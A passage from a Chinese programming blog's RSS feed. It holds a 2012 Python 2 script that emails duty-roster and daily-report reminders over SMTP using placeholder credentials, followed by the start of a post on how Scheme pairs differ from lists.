&lt;span class="n"&gt;member&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;member1&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;member2&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;member3&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;member4&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;member5&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;member6&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;member7&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;member8&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;member9&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;member10&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;member11&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;member12&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="n"&gt;suffix&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;'@&lt;/span&gt;&lt;span class="n"&gt;abc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;

&lt;span class="n"&gt;def&lt;/span&gt; &lt;span class="n"&gt;send_mail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;receiver&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;content_filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="n"&gt;sender&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;admin&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;abc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="n"&gt;server&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="mf"&gt;192.168.1.1&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;admin&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;abc&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;admin&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;

    &lt;span class="n"&gt;subject&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;''&lt;/span&gt;
    &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;''&lt;/span&gt;

    &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="err"&gt; 从文件读取邮件正文 &lt;/span&gt;
    &lt;span class="nl"&gt;try:&lt;/span&gt;
        &lt;span class="n"&gt;content_file&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content_filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sc"&gt;'r'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="nl"&gt;try:&lt;/span&gt;
            &lt;span class="n"&gt;subject&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;content_file&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;content_file&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

            &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="err"&gt; 转为 &lt;/span&gt;&lt;span class="n"&gt;utf&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
            &lt;span class="n"&gt;subject&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;subject&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;gbk&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;ignore&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;utf&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;gbk&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;ignore&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;utf&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="nl"&gt;finally:&lt;/span&gt;
            &lt;span class="n"&gt;content_file&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;except&lt;/span&gt; &lt;span class="n"&gt;IOError&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stderr&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"cannot open file "&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;content_filename&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt;

    &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s"&gt;"&lt;/span&gt;&lt;span class="se"&gt;\n\n&lt;/span&gt;&lt;span class="s"&gt; 系统生成，请勿回复 :)"&lt;/span&gt;
    &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="n"&gt;print&lt;/span&gt; &lt;span class="n"&gt;content&lt;/span&gt;

    &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="err"&gt; 构造邮件 &lt;/span&gt;
    &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MIMEText&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;plain&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;utf&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;Subject&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;subject&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;utf&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;From&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sender&lt;/span&gt;
    &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;To&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;receiver&lt;/span&gt;


    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="nl"&gt;try:&lt;/span&gt;
            &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="n"&gt;stmp&lt;/span&gt;&lt;span class="err"&gt; 模块发送邮件 &lt;/span&gt;
            &lt;span class="n"&gt;smtp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;smtplib&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SMTP&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="n"&gt;smtp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;smtp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;smtp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendmail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sender&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;receiver&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;as_string&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
            &lt;span class="n"&gt;smtp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;quit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

            &lt;span class="n"&gt;print&lt;/span&gt; &lt;span class="s"&gt;"Success"&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;True&lt;/span&gt;

        &lt;span class="n"&gt;except&lt;/span&gt; &lt;span class="n"&gt;Exception&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;print&lt;/span&gt; &lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;False&lt;/span&gt;


&lt;span class="n"&gt;def&lt;/span&gt; &lt;span class="n"&gt;get_on_duty&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;receiver&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;''&lt;/span&gt;
    &lt;span class="n"&gt;days&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2012&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)).&lt;/span&gt;&lt;span class="n"&gt;days&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;days&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;days&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;days&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="err"&gt; 提前一天提醒 &lt;/span&gt;
        &lt;span class="n"&gt;week&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;days&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
        &lt;span class="n"&gt;date&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;days&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="err"&gt; 周六发周一的值日 &lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;date&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;date&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;week&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;member&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;date&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;member&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;week&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;member&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;week&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;date&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;receiver&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;member&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;week&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;date&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;suffix&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;receiver&lt;/span&gt;


&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;__main__&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;job&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

        &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="err"&gt; 值日 &lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;job&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;duty&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;receiver&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_on_duty&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="n"&gt;print&lt;/span&gt; &lt;span class="n"&gt;receiver&lt;/span&gt;

            &lt;span class="n"&gt;content_filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;duty&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;weekday&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;content_filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;duty_Sat&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;

            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;receiver&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;suffix&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;send_mail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;receiver&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;receiver&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;content_filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;content_filename&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="err"&gt; 每天日报提醒 &lt;/span&gt;
        &lt;span class="n"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;job&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;daily&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;send_mail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;receiver&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;partner&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;content_filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="n"&gt;daily_alert&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;&lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Sun, 30 Sep 2012 00:40:00 +0800</pubDate><guid>tag:www.goorockey.com,2012-09-30:blog/2012/09/30/pythonfa-you-jian-jiao-ben/</guid><category>python</category></item><item><title>Scheme里面的pair和list</title><link>http://www.goorockey.com/blog/2012/09/25/schemeli-mian-de-pairhe-list/</link><description>
&lt;p&gt; 最近学 scheme，总结一下 pair 和 list 的区别，主要是两点：&lt;/p&gt;
&lt;h3 id="1-listpairnulllistpairlist"&gt;1. list 一定是 pair，但只有以 null（空 list）结尾的 pair 才是 list&lt;/h3&gt;
&lt;p&gt; 对于 (define list1 (list a b c)),list1 表现为 (a b c), 其实也可以写成 (a . (b . ()))。&lt;/p&gt;
&lt;p&gt; 可以看到 list 其实就是 pair, 而且是以 null 结尾的 pair。&lt;/p&gt;
&lt;p&gt; 对于像 (a.(b.(c.d))) 这样的连续 pair，因为没有以空 list 结尾，所以不是 list&lt;/p&gt;
&lt;p&gt; 所以有：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;define&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="err"&gt;'&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="cp"&gt;#t&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cons&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="cp"&gt;#t&lt;/span&gt;
